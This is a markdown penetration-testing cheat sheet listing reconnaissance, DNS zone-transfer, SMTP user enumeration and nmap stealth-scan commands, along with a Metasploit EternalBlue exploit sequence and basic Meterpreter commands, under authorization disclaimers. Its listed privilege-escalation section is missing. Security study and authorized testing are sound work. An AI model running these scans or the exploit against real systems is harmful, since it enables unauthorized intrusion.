# 🖥️ Server Hacking & Penetration Testing Guide

**IMPORTANT**: All techniques in this guide are for authorized testing only. Always obtain written permission before testing any system you don't own.

## Table of Contents
1. [Server Reconnaissance](#server-reconnaissance)
2. [Network Scanning](#network-scanning)
3. [Vulnerability Assessment](#vulnerability-assessment)
4. [Exploitation Techniques](#exploitation-techniques)
5. [Post-Exploitation](#post-exploitation)
6. [Server Hardening](#server-hardening)
7. [Privilege Escalation](#privilege-escalation)

---

## 🔍 Server Reconnaissance

### Information Gathering

```bash
# 1. DNS Enumeration
nslookup example.com
dig example.com
dig example.com MX
dig example.com NS

# 2. Whois Lookup
whois example.com
whois 192.168.1.1

# 3. IP Range Discovery
whois -h whois.radb.net -- '-i origin AS1234'

# 4. Reverse DNS Lookup
dig -x 192.168.1.1
host 192.168.1.1

# 5. Certificate Information
openssl s_client -connect example.com:443

# 6. Banner Grabbing
nc example.com 80
telnet example.com 22

# 7. Web Server Fingerprinting
curl -I http://example.com
curl -v http://example.com

# 8. Subdomain Enumeration
nslookup -type=AXFR example.com ns1.example.com
sublist3r -d example.com
amass enum -d example.com
```

### Service Enumeration

```bash
# Identify running services
netstat -tulpn              # Linux - all listening ports
netstat -ano                # Windows - all listening ports
ss -tulpn                   # Linux - socket statistics

# Query specific services
echo "VRFY admin" | nc mail.example.com 25    # SMTP verification
smbclient -L //192.168.1.1                    # SMB shares
snmpwalk -c public -v 1 192.168.1.1          # SNMP enumeration
```

### Email Harvesting

```bash
# Find email addresses
theHarvester -d example.com -l 100 -b google

# SMTP User Enumeration
smtp-user-enum -M VRFY -U users.txt -t mail.example.com
```

---

## 🌐 Network Scanning with Nmap

### Port Scanning

```bash
# Basic scanning
nmap 192.168.1.1
nmap -p 80,443,22 192.168.1.1
nmap -p- 192.168.1.1                    # All ports
nmap -p 1-65535 192.168.1.1             # All ports (verbose)

# Service version detection
nmap -sV 192.168.1.1                    # Detect versions
nmap -sV -sC 192.168.1.1               # Version + scripts

# OS Detection
nmap -O 192.168.1.1                     # Aggressive OS detection
nmap -A 192.168.1.1                     # All detection techniques

# Stealth Scanning
nmap -sS 192.168.1.1                    # SYN scan (stealth)
nmap -sF 192.168.1.1                    # FIN scan
nmap -sN 192.168.1.1                    # NULL scan
```

---

## 🔎 Vulnerability Assessment

### Automated Vulnerability Scanning

```bash
# Nessus Scanning
# 1. Download and install from https://www.tenable.com/products/nessus
# 2. Access via https://localhost:8834

# OpenVAS
sudo docker run -d -p 9392:9392 --name openvas greenbone/openvas

# OWASP ZAP
owasp-zap.sh -cmd -quickurl http://example.com
```

---

## 💥 Exploitation Techniques

### Metasploit Framework

```bash
msfconsole
search apache
use exploit/windows/smb/ms17_010_eternalblue
set RHOST 192.168.1.100
exploit
```

---

## 🔓 Post-Exploitation

### Meterpreter Commands

```bash
help
sysinfo
whoami
pwd
ls
cd
```

---

## 🛡️ Server Hardening

### Linux Hardening

```bash
sudo apt update && sudo apt upgrade -y
sudo ufw enable
sudo ufw allow ssh
```

---

**⚠️ DISCLAIMER**: Unauthorized access is illegal. Use only on authorized systems.
